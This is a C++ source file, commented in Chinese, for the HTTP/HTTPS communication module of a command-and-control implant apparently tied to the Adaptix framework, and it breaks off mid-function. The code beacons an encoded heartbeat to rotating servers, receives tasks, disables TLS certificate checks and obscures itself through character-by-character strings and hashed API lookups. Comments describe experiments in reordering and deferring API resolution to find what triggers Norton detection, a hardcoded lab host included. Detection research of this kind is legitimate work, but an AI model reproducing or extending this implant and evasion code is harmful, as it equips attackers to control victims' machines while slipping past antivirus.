// 文件作用：HTTP/HTTPS 连接器实现：按 profile 选择目标，封装请求，发送加密数据并接收任务。
#include "ConnectorHTTP.h"
#include "ApiLoader.h"
#include "ApiDefines.h"
#include "ProcLoader.h"
#include "Encoders.h"
#include "Crypt.h"
#include "utils.h"

#ifndef DIRECT_HTTPS_LAZY_HTTP_SEND
#define DIRECT_HTTPS_LAZY_HTTP_SEND 0
#endif

#ifndef DIRECT_HTTPS_LAZY_WININET_INIT
#define DIRECT_HTTPS_LAZY_WININET_INIT 0
#endif

#ifndef DIRECT_HTTPS_WININET_INIT_ORDER
#define DIRECT_HTTPS_WININET_INIT_ORDER 0
#endif

#ifndef DIRECT_HTTPS_MEMORY_LOADER_DIAG
#define DIRECT_HTTPS_MEMORY_LOADER_DIAG 0
#endif

#if DIRECT_HTTPS_MEMORY_LOADER_DIAG
static void ConnectorDiagLog(LPCSTR text)
{
	CHAR path[MAX_PATH] = { 0 };
	DWORD n = GetEnvironmentVariableA("MMPP_LOADER_LOG", path, sizeof(path));
	if (!n || n >= sizeof(path) || !text)
		return;
	HANDLE h = CreateFileA(path, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (h == INVALID_HANDLE_VALUE)
		return;
	DWORD written = 0;
	WriteFile(h, text, StrLenA((CHAR*)text), &written, NULL);
	WriteFile(h, "\r\n", 2, &written, NULL);
	CloseHandle(h);
}

static void ConnectorDiagLogU32(LPCSTR prefix, ULONG value)
{
	CHAR buf[96] = { 0 };
	ULONG off = 0;
	if (prefix) {
		while (prefix[off] && off < sizeof(buf) - 1) {
			buf[off] = prefix[off];
			off++;
		}
	}
	CHAR digits[16] = { 0 };
	ULONG d = 0;
	if (value == 0) {
		digits[d++] = '0';
	}
	else {
		while (value && d < sizeof(digits)) {
			digits[d++] = (CHAR)('0' + (value % 10));
			value /= 10;
		}
	}
	while (d && off < sizeof(buf) - 1)
		buf[off++] = digits[--d];
	buf[off] = 0;
	ConnectorDiagLog(buf);
}
#else
#define ConnectorDiagLog(...) ((void)0)
#define ConnectorDiagLogU32(...) ((void)0)
#endif


// _isdigest 判断字符是不是数字，用于轻量级字符串转整数。
BOOL _isdigest(char c)
{
	return c >= '0' && c <= '9';
}

// _atoi 是简化版字符串转整数，避免依赖 CRT 的 atoi。
int _atoi(const char* str)
{
	int result = 0;
	int sign = 1;
	int index = 0;

	while (str[index] == ' ')
		index++;

	if (str[index] == '-' || str[index] == '+') {
		sign = (str[index] == '-') ? -1 : 1;
		index++;
	}

	while (_isdigest(str[index])) {
		int digit = str[index] - '0';
		if (result > (INT_MAX - digit) / 10)
			return (sign == 1) ? INT_MAX : INT_MIN;

		result = result * 10 + digit;
		index++;
	}
	return result * sign;
}


// ConnectorHTTP::operator new 使用本项目的内存分配函数创建 HTTP 连接器。
void* ConnectorHTTP::operator new(size_t sz)
{
	void* p = MemAllocLocal(sz);
	return p;
}

// ConnectorHTTP::operator delete 释放 HTTP 连接器对象占用的本地内存。
void ConnectorHTTP::operator delete(void* p) noexcept
{
	MemFreeLocal(&p, sizeof(ConnectorHTTP));
}

// ConnectorHTTP 构造函数初始化 HTTP profile、WinINet 函数指针和收发缓冲区。
ConnectorHTTP::ConnectorHTTP()
{
	this->functions = (HTTPFUNC*) ApiWin->LocalAlloc(LPTR, sizeof(HTTPFUNC));

	this->functions->LocalAlloc   = ApiWin->LocalAlloc;
	this->functions->LocalReAlloc = ApiWin->LocalReAlloc;
	this->functions->LocalFree    = ApiWin->LocalFree;
	this->functions->LoadLibraryA = ApiWin->LoadLibraryA;
	this->functions->GetProcAddress = ApiWin->GetProcAddress;
	this->functions->GetLastError = ApiWin->GetLastError;

	#if !DIRECT_HTTPS_LAZY_WININET_INIT
	CHAR wininet_c[12];
	wininet_c[0]  = HdChrA('w');
	wininet_c[1]  = HdChrA('i');
	wininet_c[2]  = HdChrA('n');
	wininet_c[3]  = HdChrA('i');
	wininet_c[4]  = HdChrA('n');
	wininet_c[5]  = HdChrA('e');
	wininet_c[6]  = HdChrA('t');
	wininet_c[7]  = HdChrA('.');
	wininet_c[8]  = HdChrA('d');
	wininet_c[9]  = HdChrA('l');
	wininet_c[10] = HdChrA('l');
	wininet_c[11] = HdChrA(0);

	this->hWininetModule = this->functions->LoadLibraryA(wininet_c);
	if (this->hWininetModule) {
#if DIRECT_HTTPS_NO_API_HASHING
		// Norton 定位实验：DIRECT_HTTPS_WININET_INIT_ORDER 用来扰动 WinINet API 解析顺序。
		// 目的不是长期免杀，而是回答老师的问题：初始化顺序本身是否参与短期检测评分。
#if DIRECT_HTTPS_WININET_INIT_ORDER == 1
		this->functions->InternetReadFile           = (decltype(InternetReadFile)*)           this->functions->GetProcAddress(this->hWininetModule, "InternetReadFile");
		this->functions->InternetQueryDataAvailable = (decltype(InternetQueryDataAvailable)*) this->functions->GetProcAddress(this->hWininetModule, "InternetQueryDataAvailable");
		this->functions->HttpQueryInfoA             = (decltype(HttpQueryInfoA)*)             this->functions->GetProcAddress(this->hWininetModule, "HttpQueryInfoA");
		this->functions->InternetCloseHandle        = (decltype(InternetCloseHandle)*)        this->functions->GetProcAddress(this->hWininetModule, "InternetCloseHandle");
		this->functions->InternetSetOptionA         = (decltype(InternetSetOptionA)*)         this->functions->GetProcAddress(this->hWininetModule, "InternetSetOptionA");
		this->functions->InternetQueryOptionA       = (decltype(InternetQueryOptionA)*)       this->functions->GetProcAddress(this->hWininetModule, "InternetQueryOptionA");
		this->functions->HttpOpenRequestA           = (decltype(HttpOpenRequestA)*)           this->functions->GetProcAddress(this->hWininetModule, "HttpOpenRequestA");
		this->functions->InternetConnectA           = (decltype(InternetConnectA)*)           this->functions->GetProcAddress(this->hWininetModule, "InternetConnectA");
		this->functions->InternetOpenA              = (decltype(InternetOpenA)*)              this->functions->GetProcAddress(this->hWininetModule, "InternetOpenA");
#if !DIRECT_HTTPS_LAZY_HTTP_SEND
		this->functions->HttpSendRequestA           = (decltype(HttpSendRequestA)*)           this->functions->GetProcAddress(this->hWininetModule, "HttpSendRequestA");
#endif
#elif DIRECT_HTTPS_WININET_INIT_ORDER == 2
#if !DIRECT_HTTPS_LAZY_HTTP_SEND
		this->functions->HttpSendRequestA           = (decltype(HttpSendRequestA)*)           this->functions->GetProcAddress(this->hWininetModule, "HttpSendRequestA");
#endif
		this->functions->InternetCloseHandle        = (decltype(InternetCloseHandle)*)        this->functions->GetProcAddress(this->hWininetModule, "InternetCloseHandle");
		this->functions->InternetOpenA              = (decltype(InternetOpenA)*)              this->functions->GetProcAddress(this->hWininetModule, "InternetOpenA");
		this->functions->HttpQueryInfoA             = (decltype(HttpQueryInfoA)*)             this->functions->GetProcAddress(this->hWininetModule, "HttpQueryInfoA");
		this->functions->InternetConnectA           = (decltype(InternetConnectA)*)           this->functions->GetProcAddress(this->hWininetModule, "InternetConnectA");
		this->functions->InternetQueryOptionA       = (decltype(InternetQueryOptionA)*)       this->functions->GetProcAddress(this->hWininetModule, "InternetQueryOptionA");
		this->functions->InternetReadFile           = (decltype(InternetReadFile)*)           this->functions->GetProcAddress(this->hWininetModule, "InternetReadFile");
		this->functions->HttpOpenRequestA           = (decltype(HttpOpenRequestA)*)           this->functions->GetProcAddress(this->hWininetModule, "HttpOpenRequestA");
		this->functions->InternetSetOptionA         = (decltype(InternetSetOptionA)*)         this->functions->GetProcAddress(this->hWininetModule, "InternetSetOptionA");
		this->functions->InternetQueryDataAvailable = (decltype(InternetQueryDataAvailable)*) this->functions->GetProcAddress(this->hWininetModule, "InternetQueryDataAvailable");
#else
		this->functions->InternetOpenA              = (decltype(InternetOpenA)*)              this->functions->GetProcAddress(this->hWininetModule, "InternetOpenA");
		this->functions->InternetConnectA           = (decltype(InternetConnectA)*)           this->functions->GetProcAddress(this->hWininetModule, "InternetConnectA");
		this->functions->HttpOpenRequestA           = (decltype(HttpOpenRequestA)*)           this->functions->GetProcAddress(this->hWininetModule, "HttpOpenRequestA");
#if !DIRECT_HTTPS_LAZY_HTTP_SEND
		this->functions->HttpSendRequestA           = (decltype(HttpSendRequestA)*)           this->functions->GetProcAddress(this->hWininetModule, "HttpSendRequestA");
#endif
		this->functions->InternetSetOptionA         = (decltype(InternetSetOptionA)*)         this->functions->GetProcAddress(this->hWininetModule, "InternetSetOptionA");
		this->functions->InternetQueryOptionA       = (decltype(InternetQueryOptionA)*)       this->functions->GetProcAddress(this->hWininetModule, "InternetQueryOptionA");
		this->functions->HttpQueryInfoA             = (decltype(HttpQueryInfoA)*)             this->functions->GetProcAddress(this->hWininetModule, "HttpQueryInfoA");
		this->functions->InternetQueryDataAvailable = (decltype(InternetQueryDataAvailable)*) this->functions->GetProcAddress(this->hWininetModule, "InternetQueryDataAvailable");
		this->functions->InternetCloseHandle        = (decltype(InternetCloseHandle)*)        this->functions->GetProcAddress(this->hWininetModule, "InternetCloseHandle");
		this->functions->InternetReadFile           = (decltype(InternetReadFile)*)           this->functions->GetProcAddress(this->hWininetModule, "InternetReadFile");
#endif
#else
		this->functions->InternetOpenA              = (decltype(InternetOpenA)*)              GetSymbolAddress(this->hWininetModule, HASH_FUNC_INTERNETOPENA);
		this->functions->InternetConnectA           = (decltype(InternetConnectA)*)           GetSymbolAddress(this->hWininetModule, HASH_FUNC_INTERNETCONNECTA);
		this->functions->HttpOpenRequestA           = (decltype(HttpOpenRequestA)*)           GetSymbolAddress(this->hWininetModule, HASH_FUNC_HTTPOPENREQUESTA);
#if !DIRECT_HTTPS_LAZY_HTTP_SEND
		this->functions->HttpSendRequestA           = (decltype(HttpSendRequestA)*)           GetSymbolAddress(this->hWininetModule, HASH_FUNC_HTTPSENDREQUESTA);
#endif
		this->functions->InternetSetOptionA         = (decltype(InternetSetOptionA)*)         GetSymbolAddress(this->hWininetModule, HASH_FUNC_INTERNETSETOPTIONA);
		this->functions->InternetQueryOptionA       = (decltype(InternetQueryOptionA)*)       GetSymbolAddress(this->hWininetModule, HASH_FUNC_INTERNETQUERYOPTIONA);
		this->functions->HttpQueryInfoA             = (decltype(HttpQueryInfoA)*)             GetSymbolAddress(this->hWininetModule, HASH_FUNC_HTTPQUERYINFOA);
		this->functions->InternetQueryDataAvailable = (decltype(InternetQueryDataAvailable)*) GetSymbolAddress(this->hWininetModule, HASH_FUNC_INTERNETQUERYDATAAVAILABLE);
		this->functions->InternetCloseHandle        = (decltype(InternetCloseHandle)*)        GetSymbolAddress(this->hWininetModule, HASH_FUNC_INTERNETCLOSEHANDLE);
		this->functions->InternetReadFile           = (decltype(InternetReadFile)*)           GetSymbolAddress(this->hWininetModule, HASH_FUNC_INTERNETREADFILE);
#endif
	}
	#endif
}

// EnsureWininetApis 在首次实际请求前加载 WinINet 并解析基础 API。
BOOL ConnectorHTTP::EnsureWininetApis()
{
	if (!this->functions)
		return FALSE;

	if (!this->hWininetModule) {
		CHAR wininet_c[12];
		wininet_c[0]  = HdChrA('w');
		wininet_c[1]  = HdChrA('i');
		wininet_c[2]  = HdChrA('n');
		wininet_c[3]  = HdChrA('i');
		wininet_c[4]  = HdChrA('n');
		wininet_c[5]  = HdChrA('e');
		wininet_c[6]  = HdChrA('t');
		wininet_c[7]  = HdChrA('.');
		wininet_c[8]  = HdChrA('d');
		wininet_c[9]  = HdChrA('l');
		wininet_c[10] = HdChrA('l');
		wininet_c[11] = HdChrA(0);
		this->hWininetModule = this->functions->LoadLibraryA(wininet_c);
	}
	if (!this->hWininetModule)
		return FALSE;

#if DIRECT_HTTPS_NO_API_HASHING
#if DIRECT_HTTPS_WININET_INIT_ORDER == 1
	this->functions->InternetReadFile           = (decltype(InternetReadFile)*)           this->functions->GetProcAddress(this->hWininetModule, "InternetReadFile");
	this->functions->InternetQueryDataAvailable = (decltype(InternetQueryDataAvailable)*) this->functions->GetProcAddress(this->hWininetModule, "InternetQueryDataAvailable");
	this->functions->HttpQueryInfoA             = (decltype(HttpQueryInfoA)*)             this->functions->GetProcAddress(this->hWininetModule, "HttpQueryInfoA");
	this->functions->InternetCloseHandle        = (decltype(InternetCloseHandle)*)        this->functions->GetProcAddress(this->hWininetModule, "InternetCloseHandle");
	this->functions->InternetSetOptionA         = (decltype(InternetSetOptionA)*)         this->functions->GetProcAddress(this->hWininetModule, "InternetSetOptionA");
	this->functions->InternetQueryOptionA       = (decltype(InternetQueryOptionA)*)       this->functions->GetProcAddress(this->hWininetModule, "InternetQueryOptionA");
	this->functions->HttpOpenRequestA           = (decltype(HttpOpenRequestA)*)           this->functions->GetProcAddress(this->hWininetModule, "HttpOpenRequestA");
	this->functions->InternetConnectA           = (decltype(InternetConnectA)*)           this->functions->GetProcAddress(this->hWininetModule, "InternetConnectA");
	this->functions->InternetOpenA              = (decltype(InternetOpenA)*)              this->functions->GetProcAddress(this->hWininetModule, "InternetOpenA");
#if !DIRECT_HTTPS_LAZY_HTTP_SEND
	this->functions->HttpSendRequestA           = (decltype(HttpSendRequestA)*)           this->functions->GetProcAddress(this->hWininetModule, "HttpSendRequestA");
#endif
#elif DIRECT_HTTPS_WININET_INIT_ORDER == 2
#if !DIRECT_HTTPS_LAZY_HTTP_SEND
	this->functions->HttpSendRequestA           = (decltype(HttpSendRequestA)*)           this->functions->GetProcAddress(this->hWininetModule, "HttpSendRequestA");
#endif
	this->functions->InternetCloseHandle        = (decltype(InternetCloseHandle)*)        this->functions->GetProcAddress(this->hWininetModule, "InternetCloseHandle");
	this->functions->InternetOpenA              = (decltype(InternetOpenA)*)              this->functions->GetProcAddress(this->hWininetModule, "InternetOpenA");
	this->functions->HttpQueryInfoA             = (decltype(HttpQueryInfoA)*)             this->functions->GetProcAddress(this->hWininetModule, "HttpQueryInfoA");
	this->functions->InternetConnectA           = (decltype(InternetConnectA)*)           this->functions->GetProcAddress(this->hWininetModule, "InternetConnectA");
	this->functions->InternetQueryOptionA       = (decltype(InternetQueryOptionA)*)       this->functions->GetProcAddress(this->hWininetModule, "InternetQueryOptionA");
	this->functions->InternetReadFile           = (decltype(InternetReadFile)*)           this->functions->GetProcAddress(this->hWininetModule, "InternetReadFile");
	this->functions->HttpOpenRequestA           = (decltype(HttpOpenRequestA)*)           this->functions->GetProcAddress(this->hWininetModule, "HttpOpenRequestA");
	this->functions->InternetSetOptionA         = (decltype(InternetSetOptionA)*)         this->functions->GetProcAddress(this->hWininetModule, "InternetSetOptionA");
	this->functions->InternetQueryDataAvailable = (decltype(InternetQueryDataAvailable)*) this->functions->GetProcAddress(this->hWininetModule, "InternetQueryDataAvailable");
#else
	this->functions->InternetOpenA              = (decltype(InternetOpenA)*)              this->functions->GetProcAddress(this->hWininetModule, "InternetOpenA");
	this->functions->InternetConnectA           = (decltype(InternetConnectA)*)           this->functions->GetProcAddress(this->hWininetModule, "InternetConnectA");
	this->functions->HttpOpenRequestA           = (decltype(HttpOpenRequestA)*)           this->functions->GetProcAddress(this->hWininetModule, "HttpOpenRequestA");
#if !DIRECT_HTTPS_LAZY_HTTP_SEND
	this->functions->HttpSendRequestA           = (decltype(HttpSendRequestA)*)           this->functions->GetProcAddress(this->hWininetModule, "HttpSendRequestA");
#endif
	this->functions->InternetSetOptionA         = (decltype(InternetSetOptionA)*)         this->functions->GetProcAddress(this->hWininetModule, "InternetSetOptionA");
	this->functions->InternetQueryOptionA       = (decltype(InternetQueryOptionA)*)       this->functions->GetProcAddress(this->hWininetModule, "InternetQueryOptionA");
	this->functions->HttpQueryInfoA             = (decltype(HttpQueryInfoA)*)             this->functions->GetProcAddress(this->hWininetModule, "HttpQueryInfoA");
	this->functions->InternetQueryDataAvailable = (decltype(InternetQueryDataAvailable)*) this->functions->GetProcAddress(this->hWininetModule, "InternetQueryDataAvailable");
	this->functions->InternetCloseHandle        = (decltype(InternetCloseHandle)*)        this->functions->GetProcAddress(this->hWininetModule, "InternetCloseHandle");
	this->functions->InternetReadFile           = (decltype(InternetReadFile)*)           this->functions->GetProcAddress(this->hWininetModule, "InternetReadFile");
#endif
#else
	this->functions->InternetOpenA              = (decltype(InternetOpenA)*)              GetSymbolAddress(this->hWininetModule, HASH_FUNC_INTERNETOPENA);
	this->functions->InternetConnectA           = (decltype(InternetConnectA)*)           GetSymbolAddress(this->hWininetModule, HASH_FUNC_INTERNETCONNECTA);
	this->functions->HttpOpenRequestA           = (decltype(HttpOpenRequestA)*)           GetSymbolAddress(this->hWininetModule, HASH_FUNC_HTTPOPENREQUESTA);
#if !DIRECT_HTTPS_LAZY_HTTP_SEND
	this->functions->HttpSendRequestA           = (decltype(HttpSendRequestA)*)           GetSymbolAddress(this->hWininetModule, HASH_FUNC_HTTPSENDREQUESTA);
#endif
	this->functions->InternetSetOptionA         = (decltype(InternetSetOptionA)*)         GetSymbolAddress(this->hWininetModule, HASH_FUNC_INTERNETSETOPTIONA);
	this->functions->InternetQueryOptionA       = (decltype(InternetQueryOptionA)*)       GetSymbolAddress(this->hWininetModule, HASH_FUNC_INTERNETQUERYOPTIONA);
	this->functions->HttpQueryInfoA             = (decltype(HttpQueryInfoA)*)             GetSymbolAddress(this->hWininetModule, HASH_FUNC_HTTPQUERYINFOA);
	this->functions->InternetQueryDataAvailable = (decltype(InternetQueryDataAvailable)*) GetSymbolAddress(this->hWininetModule, HASH_FUNC_INTERNETQUERYDATAAVAILABLE);
	this->functions->InternetCloseHandle        = (decltype(InternetCloseHandle)*)        GetSymbolAddress(this->hWininetModule, HASH_FUNC_INTERNETCLOSEHANDLE);
	this->functions->InternetReadFile           = (decltype(InternetReadFile)*)           GetSymbolAddress(this->hWininetModule, HASH_FUNC_INTERNETREADFILE);
#endif

	BOOL ready = this->functions->InternetOpenA &&
		this->functions->InternetConnectA &&
		this->functions->HttpOpenRequestA &&
		this->functions->InternetSetOptionA &&
		this->functions->InternetQueryOptionA &&
		this->functions->HttpQueryInfoA &&
		this->functions->InternetQueryDataAvailable &&
		this->functions->InternetCloseHandle &&
		this->functions->InternetReadFile;
#if !DIRECT_HTTPS_LAZY_HTTP_SEND
	ready = ready && this->functions->HttpSendRequestA;
#endif
	return ready;
}

// EnsureHttpSendRequestA 在真正要发送 HTTP 请求前，按需解析 HttpSendRequestA。
//
// 这是老师建议的“笨办法”实验：如果某个 API 是检测重点，就不要在构造函数里提前初始化，
// 而是等走到精准调用点前一行再解析。这样可以区分：
// - 仅解析/初始化 HttpSendRequestA 是否触发；
// - 还是必须真正调用 HttpSendRequestA 并发送 profile/header/beat 才触发。
BOOL ConnectorHTTP::EnsureHttpSendRequestA()
{
	if (this->functions && this->functions->HttpSendRequestA)
		return TRUE;
	if (!this->functions)
		return FALSE;
	if (!this->EnsureWininetApis())
		return FALSE;

	if (!this->hWininetModule) {
		CHAR wininet_c[12];
		wininet_c[0]  = HdChrA('w');
		wininet_c[1]  = HdChrA('i');
		wininet_c[2]  = HdChrA('n');
		wininet_c[3]  = HdChrA('i');
		wininet_c[4]  = HdChrA('n');
		wininet_c[5]  = HdChrA('e');
		wininet_c[6]  = HdChrA('t');
		wininet_c[7]  = HdChrA('.');
		wininet_c[8]  = HdChrA('d');
		wininet_c[9]  = HdChrA('l');
		wininet_c[10] = HdChrA('l');
		wininet_c[11] = HdChrA(0);
		this->hWininetModule = this->functions->LoadLibraryA(wininet_c);
	}
	if (!this->hWininetModule)
		return FALSE;

#if DIRECT_HTTPS_NO_API_HASHING
	this->functions->HttpSendRequestA = (decltype(HttpSendRequestA)*)this->functions->GetProcAddress(this->hWininetModule, "HttpSendRequestA");
#else
	this->functions->HttpSendRequestA = (decltype(HttpSendRequestA)*)GetSymbolAddress(this->hWininetModule, HASH_FUNC_HTTPSENDREQUESTA);
#endif
	return this->functions->HttpSendRequestA != NULL;
}

// SetProfile 从 AgentConfig 复制 HTTP/HTTPS 通信参数，并准备首次心跳数据。
BOOL ConnectorHTTP::SetProfile(void* profilePtr, BYTE* beat, ULONG beatSize)
{
	ProfileHTTP profile = *(ProfileHTTP*)profilePtr;
	LPSTR encBeat = b64_encode(beat, beatSize);

	ULONG enc_beat_length = StrLenA(encBeat);
	ULONG param_length    = StrLenA((CHAR*)profile.parameter);
	ULONG headers_length  = StrLenA((CHAR*)profile.http_headers);

	CHAR connectionCloseHeader[] = {
		'C','o','n','n','e','c','t','i','o','n',':',' ','c','l','o','s','e','\r','\n', 0
	};
	ULONG close_header_length = StrLenA(connectionCloseHeader);

	CHAR* HttpHeaders = (CHAR*)this->functions->LocalAlloc(LPTR, param_length + enc_beat_length + headers_length + close_header_length + 5);
	memcpy(HttpHeaders, profile.http_headers, headers_length);
	ULONG index = headers_length;
	memcpy(HttpHeaders + index, profile.parameter, param_length);
	index += param_length;
	HttpHeaders[index++] = ':';
	HttpHeaders[index++] = ' ';
	memcpy(HttpHeaders + index, encBeat, enc_beat_length);
	index += enc_beat_length;
	HttpHeaders[index++] = '\r';
	HttpHeaders[index++] = '\n';
	memcpy(HttpHeaders + index, connectionCloseHeader, close_header_length);
	index += close_header_length;
	HttpHeaders[index++] = 0;

	memset(encBeat, 0, enc_beat_length);
	this->functions->LocalFree(encBeat);
	encBeat = NULL;

	this->headers        = HttpHeaders;
	this->server_count   = profile.servers_count;
	this->server_address = (CHAR**)profile.servers;
	this->server_ports   = profile.ports;
	this->ssl            = profile.use_ssl;
	this->http_method    = (CHAR*)profile.http_method;
	this->uri_count      = profile.uri_count;
	this->uris           = (CHAR**) profile.uris;
	this->ua_count       = profile.ua_count;
	this->user_agents    = (CHAR**) profile.user_agents;
	this->hh_count       = profile.hh_count;
	this->host_headers   = (CHAR**) profile.host_headers;
	this->rotation_mode  = profile.rotation_mode;
	this->ans_size       = profile.ans_size;
	this->ans_pre_size   = profile.ans_pre_size;

	this->proxy_type     = profile.proxy_type;
	this->proxy_username = (CHAR*)profile.proxy_username;
	this->proxy_password = (CHAR*)profile.proxy_password;

	if (this->proxy_type != PROXY_TYPE_NONE && profile.proxy_host != NULL) {
		ULONG hostLen = StrLenA((CHAR*)profile.proxy_host);
		WORD port = profile.proxy_port;
		CHAR portStr[6];
		int portIdx = 0;
		if (port == 0) {
			portStr[portIdx++] = '0';
		}
		else {
			CHAR temp[6];
			int tempIdx = 0;
			while (port > 0) {
				temp[tempIdx++] = '0' + (port % 10);
				port /= 10;
			}
			for (int i = tempIdx - 1; i >= 0; i--) {
				portStr[portIdx++] = temp[i];
			}
		}
		portStr[portIdx] = 0;

		ULONG prefixLen = 0;
		if (this->proxy_type == PROXY_TYPE_HTTPS) {
			prefixLen = 8;
		}
		this->proxy_url = (CHAR*)this->functions->LocalAlloc(LPTR, prefixLen + hostLen + 1 + portIdx + 1);
		ULONG idx = 0;
		if (this->proxy_type == PROXY_TYPE_HTTPS) {
			this->proxy_url[idx++] = 'h';
			this->proxy_url[idx++] = 't';
			this->proxy_url[idx++] = 't';
			this->proxy_url[idx++] = 'p';
			this->proxy_url[idx++] = 's';
			this->proxy_url[idx++] = ':';
			this->proxy_url[idx++] = '/';
			this->proxy_url[idx++] = '/';
		}
		memcpy(this->proxy_url + idx, profile.proxy_host, hostLen);
		idx += hostLen;
		this->proxy_url[idx++] = ':';
		memcpy(this->proxy_url + idx, portStr, portIdx + 1);
	}

	return TRUE;
}


// ProbeRequestStage 是 Norton 定位实验用的“网络分段探针”。
// 它复用 SetProfile 后保存的 UA、URI、Header、Host header 等 profile 数据，
// 但只执行 SendData() 的一部分：
// - stage 80：InternetOpen + InternetConnect + HttpOpenRequest 后返回，不发送请求。
// - stage 82：HttpSendRequest 后立即返回，不读响应。
// - stage 85：改成普通 HTTP 8000 目标，发送同样形状的请求头后返回。
DWORD ConnectorHTTP::ProbeRequestStage(ULONG stage, BOOL forcePlainHttp8000)
{
	this->recvSize = 0;
	this->recvData = 0;
	if (!this->EnsureWininetApis())
		return 1580;

	DWORD context = 0;
	BOOL result = FALSE;

	if (this->hConnect) {
		this->functions->InternetCloseHandle(this->hConnect);
		this->hConnect = NULL;
	}
	if (this->hInternet) {
		this->functions->InternetCloseHandle(this->hInternet);
		this->hInternet = NULL;
	}

	CHAR plainServer[] = { '1','9','2','.','1','6','8','.','1','2','7','.','1','3','0', 0 };
	CHAR plainUri[] = { '/', 0 };

	CHAR fallbackUA[] = { 'M','o','z','i','l','l','a','/','5','.','0', 0 };
	CHAR* currentUA = NULL;
	if (this->user_agents && this->ua_count > 0)
		currentUA = this->user_agents[this->ua_index % this->ua_count];
	if (!currentUA)
		currentUA = fallbackUA;

	if (!forcePlainHttp8000 && this->proxy_url != NULL) {
		this->hInternet = this->functions->InternetOpenA(currentUA, INTERNET_OPEN_TYPE_PROXY, this->proxy_url, NULL, 0);
	}
	else {
		this->hInternet = this->functions->InternetOpenA(currentUA, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	}
	if (!this->hInternet)
		return 1581;

	CHAR* targetServer = forcePlainHttp8000 ? plainServer : this->server_address[this->server_index];
	WORD targetPort = forcePlainHttp8000 ? 8000 : this->server_ports[this->server_index];
	BOOL targetSsl = forcePlainHttp8000 ? FALSE : this->ssl;
	CHAR* targetUri = forcePlainHttp8000 ? plainUri : this->uris[this->uri_index];

	this->hConnect = this->functions->InternetConnectA(this->hInternet, targetServer, targetPort, NULL, NULL, INTERNET_SERVICE_HTTP, 0, (DWORD_PTR)&context);
	if (!this->hConnect)
		return 1582;

	CHAR acceptTypes[] = { '*', '/', '*', 0 };
	LPCSTR rgpszAcceptTypes[] = { acceptTypes, 0 };
	// Do not request a persistent HTTP connection here.  The Adaptix listener can
	// reply without a Content-Length for empty task polls; with keep-alive enabled
	// WinINet may keep the socket established and the agent blocks in the read
	// path after the first check-in instead of returning to the beacon loop.
	DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_UI | INTERNET_FLAG_NO_COOKIES;
	if (targetSsl)
		flags |= INTERNET_FLAG_SECURE;

	HINTERNET hRequest = this->functions->HttpOpenRequestA(this->hConnect, this->http_method, targetUri, 0, 0, rgpszAcceptTypes, flags, (DWORD_PTR)&context);
	if (!hRequest)
		return 1583;

	if (targetSsl) {
		DWORD dwFlags = 0;
		DWORD dwBuffer = sizeof(DWORD);
		result = this->functions->InternetQueryOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, &dwBuffer);
		if (!result)
			dwFlags = 0;
		dwFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_REVOCATION | SECURITY_FLAG_IGNORE_WRONG_USAGE;
		this->functions->InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
	}
	DWORD ioTimeoutMs = 5000;
	this->functions->InternetSetOptionA(hRequest, INTERNET_OPTION_RECEIVE_TIMEOUT, &ioTimeoutMs, sizeof(ioTimeoutMs));
	this->functions->InternetSetOptionA(hRequest, INTERNET_OPTION_SEND_TIMEOUT, &ioTimeoutMs, sizeof(ioTimeoutMs));

	if (!forcePlainHttp8000 && this->proxy_type != PROXY_TYPE_NONE && this->proxy_username != NULL) {
		this->functions->InternetSetOptionA(hRequest, INTERNET_OPTION_PROXY_USERNAME, this->proxy_username, StrLenA(this->proxy_username));
		if (this->proxy_password != NULL)
			this->functions->InternetSetOptionA(hRequest, INTERNET_OPTION_PROXY_PASSWORD, this->proxy_password, StrLenA(this->proxy_password));
	}

	if (stage == 80) {
		this->functions->InternetCloseHandle(hRequest);
		return 1500 + stage;
	}

	CHAR* reqHeaders = this->headers;
	CHAR* tmpHeaders = NULL;
	if (this->hh_count > 0) {
		CHAR* currentHH = this->host_headers[this->hh_index];
		ULONG hhLen = StrLenA(currentHH);
		ULONG baseLen = StrLenA(this->headers);

		BOOL hasPort = FALSE;
		for (ULONG i = 0; i < hhLen; i++) {
			if (currentHH[i] == ':') {
				hasPort = TRUE;
				break;
			}
		}

		BOOL needPort = FALSE;
		CHAR portStr[6] = {0};
		ULONG portLen = 0;
		if (!hasPort) {
			if ((targetSsl && targetPort != 443) || (!targetSsl && targetPort != 80)) {
				needPort = TRUE;
				WORD port = targetPort;
				if (port == 0) {
					portStr[portLen++] = '0';
				} else {
					CHAR temp[6];
					int tempIdx = 0;
					while (port > 0) {
						temp[tempIdx++] = '0' + (port % 10);
						port /= 10;
					}
					for (int i = tempIdx - 1; i >= 0; i--)
						portStr[portLen++] = temp[i];
				}
				portStr[portLen] = 0;
			}
		}

		ULONG allocSize = 6 + hhLen + (needPort ? 1 + portLen : 0) + 2 + baseLen + 1;
		tmpHeaders = (CHAR*)this->functions->LocalAlloc(LPTR, allocSize);
		ULONG off = 0;
		tmpHeaders[off++] = 'H'; tmpHeaders[off++] = 'o'; tmpHeaders[off++] = 's';
		tmpHeaders[off++] = 't'; tmpHeaders[off++] = ':'; tmpHeaders[off++] = ' ';
		memcpy(tmpHeaders + off, currentHH, hhLen); off += hhLen;
		if (needPort) {
			tmpHeaders[off++] = ':';
			memcpy(tmpHeaders + off, portStr, portLen); off += portLen;
		}
		tmpHeaders[off++] = '\r'; tmpHeaders[off++] = '\n';
		memcpy(tmpHeaders + off, this->headers, baseLen); off += baseLen;
		tmpHeaders[off] = 0;
		reqHeaders = tmpHeaders;
	}

	if (stage == 90) {
		BOOL resolvedOnly = this->EnsureHttpSendRequestA();
		if (tmpHeaders) {
			memset(tmpHeaders, 0, StrLenA(tmpHeaders));
			this->functions->LocalFree(tmpHeaders);
		}
		this->functions->InternetCloseHandle(hRequest);
		return resolvedOnly ? 1590 : 1690;
	}

	if (!this->EnsureHttpSendRequestA()) {
		if (tmpHeaders) {
			memset(tmpHeaders, 0, StrLenA(tmpHeaders));
